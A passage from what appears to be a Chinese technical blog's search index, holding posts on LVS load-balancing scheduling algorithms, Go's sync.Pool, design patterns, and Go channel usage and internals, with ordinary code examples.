简称WLC，是小连接调度的超集，各个服务器相应的权值表示其处理性能。</li><li>调度器可以自动问询真实服务器的负载情况，并动态调整权值，带权重的谁不干活就给谁分配，机器配置好的权重高。</li></ul></li><li>基于局部的小连接<ul><li>Locality-Based Least Connections 简称LBLC，算法是针对请求报文的目标IP地址的 负载均衡调度，目前主要用于Cache集群系统，因为在Cache集群客户请求报文的目标IP地址是变化的。这里假设任何后端服务器都可以处理任一请求，算法的设计目标是在服务器的负载基本平衡情况下，将相同目标IP地址的请求调度到同一台服务器，来提高各台服务器的访问局部性和Cache命中率，从而提升整个集群系统的处理能力。</li></ul></li><li>带复制的基于局部性的少连接<ul><li>Locality-Based Least Connections with Replication 简称LBLCR，算法也是针对目标IP地址的负载均衡，目前主要用于Cache集群系统，它与LBLC算法不同之处是它要维护从一个目标IP地址到一组服务器的映射，而LBLC算法维护从一个目标IP地址到一台服务器的映射。</li></ul></li><li>目标地址散列调度<ul><li>Destination Hashing 简称DH，算法先根据请求的目标IP地址，作为散列键(Hash Key)从静态分配的散列表找出对应的服务器，若该服务器是可用的且并未超载，将请求发送到该服务器，否则返回空。</li></ul></li><li>源地址散列调度<ul><li>Source Hashing 简称SH，算法先根据请求的源IP地址，作为散列键(Hash Key)从静态分配的散列表找出对应的服务器，若该服务器是可用的且并未超载，将请求发送到该服务器，否则返回空。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-sync.Pool使用及原理</title>
      <link href="/Code/Code-Golang-Pool/"/>
      <url>/Code/Code-Golang-Pool/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div><h2 id="Pool"><a href="#Pool" class="headerlink" title="Pool"></a>Pool</h2><p>​你想看一本书，需要的时候开始印刷，看完了就卖废品，1000个人想看就得印刷1000本书，卖1000本废品。这明显太不绿色了，你想了想如果建一个图书馆，里面放几本书，大家想看的时候去借，看完了再还回去，这明显高效了不少。</p><p>​程序员发现了你用图书馆的方式合理的利用了资源，于是照猫画虎发明了连接池、线程池、协程池、内存池，各种各样的池都是想解决同类的问题：创建连接、线程等都相对比较消耗资源，通过池存一写已经新建的连接，线程…需要的时候拿去用，不用了就再还回来。借与还的模式，节省了不少资源，大家都说好。</p><p>​Golang的sync.Pool，对象池。采用对象池来创建对象，增加对象的重复利用率，使用的时候就不必在堆上重新创建对象可以节省开销。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>sync.Pool对外提供三个方法：New，Get，Put。</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pool *sync.Pool</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Book <span class="keyword">struct</span> {</span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> {</span><br><span class="line">pool = &amp;sync.Pool{</span><br><span class="line">New: <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="keyword">interface</span>{} {</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">new</span>(Book)</span><br><span class="line">},</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">book := pool.Get().(*Book)</span><br><span class="line">fmt.Println(book) <span class="comment">// &amp;{}</span></span><br><span class="line">book.Name = <span class="string">"Go Programming"</span></span><br><span class="line">pool.Put(book)</span><br><span class="line">fmt.Println(pool.Get().(*Book)) <span class="comment">// &amp;{Go Programming}</span></span><br><span class="line">fmt.Println(pool.Get().(*Book)) <span class="comment">// &amp;{}</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul><li>结构体</li></ul><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Pool <span class="keyword">struct</span> {</span><br><span class="line">noCopy noCopy <span class="comment">// 禁止拷贝</span></span><br><span class="line"></span><br><span class="line">local     unsafe.Pointer <span class="comment">// [P]poolLocal poolLocal数组指针</span></span><br><span class="line">localSize <span class="type">uintptr</span>        <span class="comment">// 数组大小</span></span><br><span class="line"></span><br><span class="line">victim     unsafe.Pointer <span class="comment">// GC处理并不直接将allPools的object直接进行GC处理，而是保存到oldPools，等到下一个GC周期到了再处理。</span></span><br><span class="line">victimSize <span class="type">uintptr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当pool没有缓存对象的时候，会调用New方法生成一个新的对象</span></span><br><span class="line">New <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="keyword">interface</span>{}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> poolLocal <span class="keyword">struct</span> {</span><br><span class="line">    poolLocalInternal</span><br><span class="line">    pad [<span class="number">128</span> - unsafe.Sizeof(poolLocalInternal{})%<span class="number">128</span>]<span class="type">byte</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">type</span> poolLocalInternal <span class="keyword">struct</span> {</span><br><span class="line">    private <span class="keyword">interface</span>{}   <span class="comment">// Can be used only by the respective P.</span></span><br><span class="line">    shared  poolChain   <span class="comment">// Local P can pushHead/popHead; any P can popTail.</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> poolChain <span class="keyword">struct</span> {</span><br><span class="line"><span class="comment">// head is the poolDequeue to push to. This is only accessed</span></span><br><span class="line"><span class="comment">// by the producer, so doesn't need to be synchronized.</span></span><br><span class="line">head *poolChainElt</span><br><span class="line"></span><br><span class="line"><span class="comment">// tail is the poolDequeue to popTail from. This is accessed</span></span><br><span class="line"><span class="comment">// by consumers, so reads and writes must be atomic.</span></span><br><span class="line">tail *poolChainElt</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><ul><li>Get</li></ul><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Pool)</span></span> Get() <span class="keyword">interface</span>{} {</span><br><span class="line"><span class="keyword">if</span> race.Enabled { <span class="comment">// 不允许竞态检测</span></span><br><span class="line">race.Disable()</span><br><span class="line">}</span><br><span class="line">l, pid := p.pin() <span class="comment">// 获取一个poolLocal</span></span><br><span class="line">x := l.private</span><br><span class="line">l.private = <span class="literal">nil</span></span><br><span class="line"><span class="keyword">if</span> x == <span class="literal">nil</span> {</span><br><span class="line"><span class="comment">// Try to pop the head of the local shard. We prefer</span></span><br><span class="line"><span class="comment">// the head over the tail for temporal locality of</span></span><br><span class="line"><span class="comment">// reuse.</span></span><br><span class="line">x, _ = l.shared.popHead()</span><br><span class="line"><span class="keyword">if</span> x == <span class="literal">nil</span> {</span><br><span class="line">x = p.getSlow(pid)</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">runtime_procUnpin()</span><br><span class="line"><span class="keyword">if</span> race.Enabled {</span><br><span class="line">race.Enable()</span><br><span class="line"><span class="keyword">if</span> x != <span class="literal">nil</span> {</span><br><span class="line">race.Acquire(poolRaceAddr(x))</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> x == <span class="literal">nil</span> &amp;&amp; p.New != <span class="literal">nil</span> { <span class="comment">// 没拿到 new一个</span></span><br><span class="line">x = p.New()</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Pool)</span></span> pin() *poolLocal {</span><br><span class="line">    pid := runtime_procPin()</span><br><span class="line">    s := atomic.LoadUintptr(&amp;p.localSize) <span class="comment">// load-acquire</span></span><br><span class="line">    l := p.local                          <span class="comment">// load-consume</span></span><br><span class="line">    <span class="keyword">if</span> <span class="type">uintptr</span>(pid) &lt; s {</span><br><span class="line">        <span class="keyword">return</span> indexLocal(l, pid)</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> p.pinSlow()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-23-%E6%9D%82-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-23-%E6%9D%82-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是设计模式"><a href="#什么是设计模式" class="headerlink" title="什么是设计模式"></a>什么是设计模式</h3><p>设计模式是为了重用代码、让人更容易理解代码、保证代码可靠性而总结出来的通用的解决方案。你从来没有学过设计模式，但是遇到类似的问题一定有自己的解决方案，那这个解决方案也算自己的设计模式吧。或者在看到某种设计模式的时候会突然发现，原来自己早就用了传说中的种种设计模式了。一直在使用，只是不知道它还有个名字。</p><h3 id="设计模式分类"><a href="#设计模式分类" class="headerlink" title="设计模式分类"></a>设计模式分类</h3><h4 id="根据目的"><a href="#根据目的" class="headerlink" title="根据目的"></a>根据目的</h4><ul><li>创建型：主要用于创建对象</li><li>结构型：主要用于处理类或对象的组合</li><li>行为型：主要用于描述对象或对象怎样交互和分配职责</li></ul><h4 id="根据范围"><a href="#根据范围" class="headerlink" title="根据范围"></a>根据范围</h4><ul><li>类模型：处理类和子类之间都得关系，这些关系是过继承简历，在编译时刻就被确定下来，属于静态的。</li><li>对象模型：处理对象间的关系，这些关系在运行时刻变化，更具动态性。</li></ul><p><img src="https://i.loli.net/2021/07/23/3ETtLMsqu4oeWJm.png" alt="640.png"></p><h4 id="创建型"><a href="#创建型" class="headerlink" title="创建型"></a>创建型</h4><ol><li><p>简单(静态)工厂：工厂类通过传入的参数决定创建哪种产品类型</p><p>定义一个工厂类来负责创建其他类的实例，被创建的实例通常都具有共同的父类，在工厂类中，可以根据参数的不同返回不同类的实例。升级版本简单工厂模式，通过反射根据类的全路径名生成对象。</p><ul><li>代码可读性更好</li><li>与使用者代码解耦</li></ul></li><li><p>抽象工厂：创建相关或依赖对象的家族，而无需明确指定具体类</p></li><li><p>建造者模式：封装一个复杂对象的构建过程，并可以按步骤构造</p><ul><li>封装复杂对象的创建过程，使对象使用者不感知复杂的创建逻辑</li><li>可以一步步按照顺序对成员进行赋值，或者创建嵌套对象，并最终完成目标对象的创建</li><li>对多个对象复用同样的对象创建逻辑</li></ul></li><li><p>单例模式：某个类只能有一个实例，提供一个全局的访问点</p><p>有一些对象通常我们只需要一个共享的实例，比如线程池、全局缓存、对象池等，这种场景下就适合使用单例模式。</p><ul><li>限制调用者直接实例化该对象</li><li>为该对象的单例提供一个全局唯一的访问方法</li></ul><p>单例模式有在初始化时机上可以分：</p><ul><li>饿汉模式：加载是就初始化，即使后续不用也会消耗一定的资源</li><li>懒汉模式：外部使用的时候才初始化，但初始化时要注意线程安全。golang once天生能处理这种情况。</li></ul></li><li><p>原型模式：通过复制现有的实例来创建新的实例</p><p>原型模式主要解决对象复制的问题，它的核心就是<code>clone()</code>方法，返回<code>Prototype</code>对象的复制品。</p></li></ol><h4 id="结构型"><a href="#结构型" class="headerlink" title="结构型"></a>结构型</h4><ol><li><p>外观模式：对外提供一个统一的方法，来访问子系统中的一群接口</p><p>外观模式经常运用于<strong>分层架构</strong>上，通常我们都会为分层架构中的每一个层级提供一个或多个统一对外的访问接口，这样就能让各个层级之间的耦合性更低，使得系统的架构更加合理。</p></li><li><p>桥接模式：将抽象部分和它的实现部分分离，使它们都可以独立的变化</p><p>桥接模式本质上就是面向接口编程，可以给系统带来很好的灵活性和可扩展性。</p></li><li><p>组合模式：将对象组合成树形结构以表示“”部分-整体“”的层次结构</p><p>将对象组合成树形结构以表示“部分-整体”的层次结构，使得用户对单个对象和组合对象的使用具有一致性，组合优于继承。</p></li><li><p>装饰模式：动态的给对象添加新的功能</p><p>使用组合而非继承的方式，能够动态地为本体对象叠加新的行为.从结构上看，装饰模式和代理模式具有很高的相似性，但是两种所强调的点不一样。前者强调的是为本体对象添加新的功能，后者强调的是对本体对象的访问控制。</p></li><li><p>代理模式：为其他对象提供一个代理以便控制这个对象的访问</p><p>使用代理模式的关键在于当Client不方便直接访问一个对象时，提供一个代理对象控制该对象的访问。Client实际上访问的是代理对象，代理对象会将Client的请求转给本体对象去处理。</p><ul><li>远程代理</li><li>虚拟代理</li><li>保护代理</li><li>缓存代理</li><li>智能引用</li></ul></li><li><p>适配器模式：将一个类的方法接口转换成客户希望的另外一个接口</p><p>让原本因为接口不匹配而无法一起工作的两个对象能够一起工作。将一个接口<code>Adaptee</code>，通过适配器<code>Adapter</code>转换成<code>Client</code>所期望的另一个接口<code>Target</code>来使用，实现原理也很简单，就是<code>Adapter</code>通过实现<code>Target</code>接口，并在对应的方法中调用<code>Adaptee</code>的接口实现。</p></li><li><p>亨元（蝇量）模式：通过共享技术来有效的支持大量细粒度的对象</p><p>享元模式摒弃了在每个对象中保存所有数据的方式， 通过共享多个对象所共有的相同状态， 让你能在有限的内存容量中载入更多对象。</p></li></ol><h4 id="行为型"><a href="#行为型" class="headerlink" title="行为型"></a>行为型</h4><ol><li>模板模式：定义一个算法结构，而将一些步骤延迟到子类实现</li><li>解释器模式：给定一个语言，定义它的文法的一种表示，并定义一个解释器</li><li>策略模式：定义一系列算法，把他们封装起来，并且使它们可以相互替换</li><li>状态模式：允许一个对象在其对象内部状态改变时改变它的行为</li><li>观察者模式：对象间的一对多的依赖关系</li><li>备忘录模式：在不破坏封装的前提下，保持对象的内部状态</li><li>中介者模式：用一个中介对象来封装一系列的对象交互</li><li>命令模式：将命令请求封装为一个对象，使得可以用不同的请求来进行参数化</li><li>访问者模式：在不改变数据结构的前提下，增加作用于一组对象元素的新功能</li><li>责任链模式：将请求的发送者和接收者解耦，使的多个对象都有处理这个请求的机会</li><li>迭代器模式：一种遍历访问聚合对象中各个元素的方法，不暴露该对象的内部结构</li></ol><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p><a href="https://github.com/blinkbean/goSteps">https://github.com/blinkbean/goSteps</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-Channel能怎么用?</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-22-Golang-Channel%E8%83%BD%E6%80%8E%E4%B9%88%E7%94%A8/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-07-22-Golang-Channel%E8%83%BD%E6%80%8E%E4%B9%88%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="Golang-CSP"><a href="#Golang-CSP" class="headerlink" title="Golang CSP"></a>Golang CSP</h3><blockquote><p>不要通过共享内存来通信，而应该通过通信来共享内存。</p></blockquote><p>CSP模型用于描述两个独立的并发实体通过共享的通信管道（channel）进行通信的并发模型。Golang借用process和channel两个概念作为并发的理论支持。process在golang表现就是goroutine是实际并发执行的实体，每个实体之间通过channel通信实现数据共享。</p><h3 id="channel初始化"><a href="#channel初始化" class="headerlink" title="channel初始化"></a>channel初始化</h3><p>使用channel必须make初始化。</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unBufferChan := <span class="built_in">make</span>(<span class="keyword">chan</span> Type, <span class="number">0</span>) <span class="comment">// Type: int、string...</span></span><br><span class="line">bufferChan := <span class="built_in">make</span>(<span class="keyword">chan</span> Type, N) <span class="comment">// 有缓存的通道</span></span><br></pre></td></tr></tbody></table></figure><p>如果使用未初始化的channel会有dead lock错误：</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    <span class="keyword">var</span> x <span class="keyword">chan</span> <span class="type">int</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> {</span><br><span class="line">        x &lt;- <span class="number">1</span></span><br><span class="line">    }()</span><br><span class="line">    &lt;-x</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">--------</span><br><span class="line"></span><br><span class="line">fatal <span class="type">error</span>: all goroutines are asleep - deadlock!</span><br><span class="line"></span><br><span class="line">goroutine <span class="number">1</span> [<span class="keyword">chan</span> receive (<span class="literal">nil</span> <span class="keyword">chan</span>)]:</span><br><span class="line">main.main()</span><br></pre></td></tr></tbody></table></figure><h3 id="单向channel"><a href="#单向channel" class="headerlink" title="单向channel"></a>单向channel</h3><p>单向channel主要用在函数声明中。是约定，但是强制必须这样。</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 输入一个只能写的channel，返回一个只能读的channel</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">(ch <span class="keyword">chan</span>&lt;- <span class="type">int</span>)</span></span> &lt;-<span class="keyword">chan</span> <span class="type">int</span> {...}</span><br><span class="line"></span><br><span class="line"><span class="comment">// context包的Done()方法。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Context)</span></span> Done() &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>{} {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="channel读写"><a href="#channel读写" class="headerlink" title="channel读写"></a>channel读写</h3><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读操作</span></span><br><span class="line">x &lt;- ch</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写操作</span></span><br><span class="line">ch &lt;- x</span><br></pre></td></tr></tbody></table></figure><ul><li>读<ol><li>从空的缓冲channel里读消息，会block。</li><li>从无缓冲channel读消息，如果没有另一个goroutine正在写，会block。</li><li>从已关闭的channel读消息，==v,ok := &lt;-c==，v为通道类型的默认值，ok为false。</li></ol></li><li>写<ol><li>向无缓冲channel写消息，如果没有另一个goroutine正在读，会block。</li><li>向已关闭的channel写消息，会panic。==panic: send on closed channel==。</li></ol></li></ul><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><p>select内channel有点特殊，不会block，与golang编译有关。</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> {</span><br><span class="line">    <span class="keyword">case</span> e, ok := &lt;-ch1:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> e, ok := &lt;-ch2:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> {</span><br><span class="line">    <span class="keyword">select</span> {</span><br><span class="line">        ...</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 超时控制</span></span><br><span class="line"><span class="keyword">select</span> {</span><br><span class="line">  <span class="keyword">case</span> &lt;- ch:</span><br><span class="line">    <span class="comment">// get data from ch</span></span><br><span class="line">  <span class="keyword">case</span> &lt;- time.After(<span class="number">2</span> * time.Second)</span><br><span class="line">    <span class="comment">// read data from ch timeout</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="range"><a href="#range" class="headerlink" title="range"></a>range</h3><p>一旦 channel 关闭，channel 内部数据读完之后循环自动结束。</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x := <span class="keyword">range</span> ch {</span><br><span class="line">    fmt.Println(x)</span><br><span class="line">    ...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="channel关闭"><a href="#channel关闭" class="headerlink" title="channel关闭"></a>channel关闭</h3><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭</span></span><br><span class="line"><span class="built_in">close</span>(ch)</span><br></pre></td></tr></tbody></table></figure><ul><li>关<ol><li>重复关闭channel，会panic。==panic: close of closed channel==。</li></ol></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.jianshu.com/p/36e246c6153d">https://www.jianshu.com/p/36e246c6153d</a></p><p><a href="http://legendtkl.com/2017/07/30/understanding-golang-channel/">http://legendtkl.com/2017/07/30/understanding-golang-channel/</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-Channel底层是怎么实现的?</title>
      <link href="/Code/Code-Golang-channel/"/>
      <url>/Code/Code-Golang-channel/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>channel 是 golang 的最重要的一个结构，是区别于其他高级语言的最重要的特色之一，也是 goroutine 通信必须要的要素之一。下文将基于golang1.14从channel的数据结构&amp;收、发操作的代码实现，进一步了解channel。</p><h3 id="hchan-struct"><a href="#hchan-struct" class="headerlink" title="hchan struct"></a>hchan struct</h3><p>hchan 中的所有属性大致可以分为三类：</p><ol><li>buffer 相关的属性。例如 buf、dataqsiz、qcount 等。 当 channel 的缓冲区大小不为 0 时，buffer 中存放了待接收的数据。使用 ==环形队列==(ring buffer) 实现，FIFO。</li><li>waitq 相关的属性，可以理解为是一个 FIFO 的标准队列。其中 recvq 中是正在等待接收数据的 goroutine，sendq 中是等待发送数据的 goroutine。waitq 使用==双向链表==实现。</li><li>其他属性，例如 lock、elemtype、closed 等。</li></ol><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> hchan <span class="keyword">struct</span> {</span><br><span class="line">  qcount<span class="type">uint</span><span class="comment">// 队列中数据个数</span></span><br><span class="line">  dataqsiz<span class="type">uint</span><span class="comment">// channel大小</span></span><br><span class="line">  bufunsafe.Pointer<span class="comment">// 存放数据的环形数组</span></span><br><span class="line">  elemsize<span class="type">uint16</span><span class="comment">// channel中数据类型的大小</span></span><br><span class="line">  closed<span class="type">uint32</span><span class="comment">// 表示channel是否关闭</span></span><br><span class="line">  elemtype*_type<span class="comment">// 元素数据类型</span></span><br><span class="line">  sendx<span class="type">uint</span><span class="comment">// buffer 中已发送的索引位置 send index</span></span><br><span class="line">  recvx<span class="type">uint</span><span class="comment">// buffer 中已接收的索引位置 receive index</span></span><br><span class="line">  recvqwaitq<span class="comment">// 等待接收的 goroutine list of recv waiters</span></span><br><span class="line">  sendqwaitq<span class="comment">// 等待发送的 goroutine list of send waiters</span></span><br><span class="line">  <span class="comment">// lock protects all fields in hchan, as well as several</span></span><br><span class="line">  <span class="comment">// fields in sudogs blocked on this channel.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Do not change another G's status while holding this lock</span></span><br><span class="line">  <span class="comment">// (in particular, do not ready a G), as this can deadlock</span></span><br><span class="line">  <span class="comment">// with stack shrinking.</span></span><br><span class="line">  lockmutex</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> waitq <span class="keyword">struct</span> {</span><br><span class="line">  first *sudog</span><br><span class="line">  last*sudog</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> sudog <span class="keyword">struct</span> {</span><br><span class="line">  g*g</span><br><span class="line">  selectdone*<span class="type">uint32</span> <span class="comment">// CAS to 1 to win select race (may point to stack)</span></span><br><span class="line">  next*sudog</span><br><span class="line">  prev*sudog</span><br><span class="line">  elemunsafe.Pointer <span class="comment">// data element (may point to stack)</span></span><br><span class="line">  acquiretime <span class="type">int64</span></span><br><span class="line">  releasetime <span class="type">int64</span></span><br><span class="line">  ticket      <span class="type">uint32</span></span><br><span class="line">  parent      *sudog <span class="comment">// semaRoot binary tree</span></span><br><span class="line">  waitlink    *sudog <span class="comment">// g.waiting list or semaRoot</span></span><br><span class="line">  waittail    *sudog <span class="comment">// semaRoot</span></span><br><span class="line">  c           *hchan <span class="comment">// channel</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们可以看到 </p><ol><li>channel 其实就是一个队列加一个锁，只不过这个锁是一个轻量级锁。</li><li>recvq 是读操作阻塞在 channel 的 goroutine 列表，sendq 是写操作阻塞在 channel 的 goroutine 列表。</li><li>链表的实现是 sudog，其实就是一个对 g 的结构的封装。</li></ol><h3 